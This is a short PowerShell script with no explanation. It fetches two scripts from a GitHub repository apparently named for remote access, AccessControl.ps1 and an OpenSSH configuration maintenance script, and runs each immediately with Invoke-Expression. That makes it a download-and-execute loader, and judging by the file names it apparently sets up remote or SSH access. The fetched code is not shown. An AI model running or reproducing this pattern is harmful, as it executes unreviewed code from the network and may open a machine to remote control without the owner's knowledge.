$urlfortask = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
$urlforsshdmaint = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHConfigMaintenance.ps1"
$responsefortask = Invoke-WebRequest -Uri $urlfortask -UseBasicParsing
$responseforsshdmaint = Invoke-WebRequest -Uri $urlforsshdmaint -UseBasicParsing
if ($responsefortask.StatusCode -eq 200) {
    Invoke-Expression $responsefortask.Content
}
if ($responseforsshdmaint.StatusCode -eq 200) {
    Invoke-Expression $responseforsshdmaint.Content
    Start-Sleep 5
}
